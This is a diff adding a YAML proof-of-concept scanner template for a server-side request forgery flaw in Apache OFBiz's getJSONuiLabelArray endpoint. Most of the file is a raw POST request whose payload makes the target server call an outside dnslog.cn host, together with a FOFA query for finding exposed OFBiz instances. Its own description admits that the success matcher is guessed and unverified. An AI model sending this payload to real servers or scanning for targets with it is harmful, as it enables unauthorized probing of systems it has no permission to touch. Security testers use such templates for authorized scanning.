@@ -1,0 +1,36 @@
+id: poc-09adb5598ef499332897
+info:
+  name: ApaceOFBizgetJSONuiLabelArray存在服务端请求伪造ssrf漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/09adb5598ef49933289787e59a055a5a
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: ssrf,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 09adb5598ef49933289787e59a055a5a
+    fofa: + fofa`app="Apache_OFBiz"`
+http:
+- raw:
+  - 'POST /partymgr/control/getJSONuiLabelArray HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36
+
+    Content-Length: 79
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    requiredLabels={"https://v3f9em.dnslog.cn/api":["2aZ6okJyCI0H8XLAUeiv9Yu3wOK"]}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
